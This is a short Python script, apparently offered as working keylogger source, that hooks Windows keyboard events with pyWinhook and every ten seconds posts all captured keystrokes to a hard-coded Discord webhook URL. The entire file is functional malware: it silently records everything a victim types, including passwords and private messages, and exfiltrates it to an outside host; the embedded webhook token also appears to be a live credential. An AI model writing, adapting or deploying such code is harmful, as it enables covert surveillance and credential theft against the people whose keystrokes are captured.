import pyWinhook, pythoncom, sys, logging, threading, requests

#Log File: Sends logs to discord webhook every 10 seconds

webhook = "https://discord.com/api/webhooks/1114992674987069461/wV-1u2U4TRBlKBWVqaL5vAONNLW1zrrh87r7j479R96Az3rlqwGKB5VKRUXfNNhrL71U"
log = []

OnKeyboardEvent = lambda event: log.append(event.Key)

def send_logs():
    global log
    if len(log) > 0:
        requests.post(webhook, json={'content': ''.join(log)})
        log = []
    threading.Timer(10, send_logs).start()

#Sets a hook on Windows Events
hooks_manager = pyWinhook.HookManager()
#sets the hook on keyboard events and captures the key presses
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()

#Sends the logs to the webhook

#pythoncom module captures the messages
pythoncom.PumpMessages()

